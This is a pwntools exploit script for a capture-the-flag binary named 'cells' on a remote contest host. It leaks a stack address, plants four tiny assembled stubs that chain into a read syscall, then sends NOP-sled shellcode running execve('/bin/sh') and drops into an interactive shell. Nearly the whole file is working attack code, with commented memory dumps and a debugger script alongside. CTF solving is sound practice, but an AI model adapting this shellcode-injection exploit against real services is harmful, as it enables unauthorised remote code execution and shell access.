#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host slave1.ctf.arkavidia.id --port 10002 ./cells
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./cells')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'slave1.ctf.arkavidia.id'
port = int(args.PORT or 10002)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, aslr=False, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b *interlinked
b *interlinked+197
# b *0x55555555526e
continue
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      PIE enabled
# RWX:      Has RWX segments

io = start()
# p='a'
# io.sendline(p)
# p='a'
# io.sendlineafter("inked: ",p)
# p='a'
# io.sendlineafter("stem: ",p)
# p='b'*16
# io.sendlineafter("dark: ",p)

# 0x00007ffface9a398│+0x0008: 0x48007facc91d276a
# 0x00007ffface9a3a0│+0x0010: 0x0000000a0574ff31
# 0x00007ffface9a3a8│+0x0018: 0x000a0575fff280e0
# 0x00007ffface9a3b0│+0x0020: 0x0a0674c0302be0c0
# 0x00007ffface9a3b8│+0x0028: 0xec83480000000000
# 0x00007ffface9a3c0│+0x0030: 0x90909090050f5e08   ← $rbp
context.arch = 'amd64'
def setup_haha(a1, a2, a3, a4):
    print("GOGOO")
    io.sendlineafter(" ", a1) # 0x00007ffface9a3b0│+0x0020: 0x0a0674c030 010203 # $rbp-0xd
    io.sendlineafter(":", a2) # 0x00007ffface9a3a8│+0x0018: 0x000a0575fff280 01 # $rbp-0x17
    io.sendlineafter(":", a3) # 0x00007ffface9a398│+0x0008: 0x48 01020304050607 # $rbp-0x21
                              # 0x00007ffface9a3a0│+0x0010: 0x0000000a0574ff31
    io.sendafter(":", a4) # 0x00007ffface9a3b8│+0x0028: 0xec8348 0102030405 # $rbp-0x3
io.recvuntil("- ")
stack_leak = int(io.recvuntil(":")[:-1], 16)
print(hex(stack_leak))
a1 = asm('''
xor al, al
''') + b't\x06'
assert len(a1) < 7, "a1 fails"
a2 = asm('''
xor dl, 0xff
''') + b'u\x05'
assert len(a2) < 7, "a2 fails"
a3 = asm('''
xor rdi, rdi
''') + b't\x05'
assert len(a3) < 7, "a3 fails"
a4 = asm('''
sub rsp, 0x8
pop rsi
syscall
nop
nop
nop
nop
''') + (p64(stack_leak-20))

# 0x7ffface9a398:      push   0x27
# 0x7ffface9a39a:      sbb    eax,0x7facc9
# 0x7ffface9a39f:      xor    rdi,rdi            <- ret 1
# 0x7ffface9a3a2:      je     0x7ffface9a3a9
# 0x7ffface9a3a4:      or     al,BYTE PTR [rax]
# 0x7ffface9a3a6:      add    BYTE PTR [rax],al
# 0x7ffface9a3a8:      loopne 0x7ffface9a32a
# 0x7ffface9a3a9       xor    dl, 0xff           <- ret 2
# 0x7ffface9a3ac       jne    0x7ffface9a3b3
# 0x7ffface9a3ae:      or     al,BYTE PTR [rax]
# 0x7ffface9a3b0:      shl    al,0x2b
# 0x7ffface9a3b3:      xor    al,al              <- ret 3
# 0x7ffface9a3b5:      je     0x7ffface9a3bd
# 0x7ffface9a3b7:      or     al,BYTE PTR [rax]
# 0x7ffface9a3b9:      add    BYTE PTR [rax],al
# 0x7ffface9a3bb:      add    BYTE PTR [rax],al
# 0x7ffface9a3bd:      sub    rsp,0x8           <- ret 4
# 0x7ffface9a3c1:      pop    rsi
# 0x7ffface9a3c2:      syscall
# 0x7ffface9a3c4:      nop
# 0x7ffface9a3c5:      nop

assert len(a4) < 0x15, "a4 fails"
assert b'\x0a' not in a4
pause()
setup_haha(a1, a2, a3, a4)

sleep(1)
shellcode = ''
shellcode += shellcraft.pushstr('/bin/sh\x00')
sc = b"\x90"*0x50 + asm(shellcode) + asm('''
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
mov rax, 0x3b
syscall
''')
io.sendline(sc)

io.interactive()

# tel $rbp-0xd
